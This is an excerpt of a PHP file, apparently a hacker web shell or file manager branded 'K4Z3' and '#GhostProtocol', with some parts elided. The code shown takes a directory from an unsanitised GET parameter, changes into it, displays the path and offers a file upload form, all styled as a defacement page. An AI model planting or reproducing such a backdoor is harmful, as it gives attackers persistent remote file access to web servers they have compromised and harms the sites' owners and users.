...
echo '<!DOCTYPE html><html><head><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>K4Z3</title><meta property="og:title" content="haxor"> <meta property="og:description" content="K4Z3"> <meta property="og:image" content="https://pbs.twimg.com/profile_images/1398305183/small_400x400.png"> <meta property="og:author" content="haxor"> <link rel="icon" type="image/png" href="https://pbs.twimg.com/profile_images/1398305183/small_400x400.png"><body style=background-color:black;"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script></head><body>';
echo '<center><img src="https://thumbs.gfycat.com/AbleBonyDungbeetle-size_restricted.gif" width="180" height="180"><img src="https://i.ibb.co/N6zVHWF/Screenshot-2021-03-06-15-50-24-49.png"  width="150" height="150"><img src="https://thumbs.gfycat.com/AbleBonyDungbeetle-size_restricted.gif" width="180" height="180"></center>';
echo '<div style="color:lime;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo "<font style='font-size:20px;'>Path: ";
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:lime;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
...
echo '<br><center><font color=lime><b>#GhostProtocol</center>';
echo '</body></html><!-- EOF -->';
?>